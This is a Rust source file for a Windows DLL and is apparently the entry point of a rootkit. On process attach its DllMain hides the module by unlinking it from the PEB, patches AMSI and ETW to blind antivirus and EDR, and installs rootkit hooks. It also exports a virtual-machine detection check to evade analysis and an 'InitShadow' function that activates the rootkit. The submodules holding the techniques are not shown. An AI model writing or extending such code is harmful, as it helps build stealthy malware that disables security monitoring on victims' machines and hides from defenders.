use std::sync::Once;
use winapi::shared::minwindef::{BOOL, DWORD, HINSTANCE, LPVOID, TRUE};
use winapi::um::winnt::DLL_PROCESS_ATTACH;

mod vm_detect;
mod rootkit;
mod evasion;
mod stealth;

#[no_mangle]
pub extern "system" fn DllMain(
    _dll_module: HINSTANCE,
    call_reason: DWORD,
    _reserved: LPVOID,
) -> BOOL {
    match call_reason {
        DLL_PROCESS_ATTACH => {
            // 1. Vanish: Unlink from PEB immediately to hide from module lists
            let _ = stealth::unlink_peb();

            // 2. Blind: Patch AMSI and ETW to blind AV/EDR
            let _ = evasion::patch_amsi();
            let _ = evasion::patch_etw();

            // 3. Hook: Install the rootkit hooks
            // Optional: Auto-initialize if injected via traditional methods
            rootkit::install_hooks().ok();
        }
        _ => {}
    }
    TRUE
}

/// Helper function to be called from C# to verify environment
#[no_mangle]
pub extern "C" fn PerformSecurityChecks() -> bool {
    // Returns true if SAFE (no VM detected), false if UNSAFE
    if vm_detect::is_vm() {
        return false;
    }
    true
}

/// Helper function to activate the rootkit
#[no_mangle]
pub extern "C" fn InitShadow() -> bool {
    match rootkit::install_hooks() {
        Ok(_) => true,
        Err(_) => false,
    }
}
